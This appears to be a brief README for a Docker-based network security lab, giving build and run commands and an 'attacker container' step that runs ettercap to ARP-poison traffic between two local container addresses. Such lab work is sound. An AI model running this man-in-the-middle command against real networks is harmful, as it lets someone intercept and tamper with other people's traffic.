## Commands to build individually

        sudo docker build -t <image_name> . -f <Dockerfile_name>
        sudo docker run -it <image_name>

### Attacker container command

        sudo docker run --cap-add=NET_ADMIN --cap-add=SYS_ADMIN -it attacker:test
        ettercap -T -S -i eth0 -M arp:remote //172.17.0.1/ //172.17.0.3/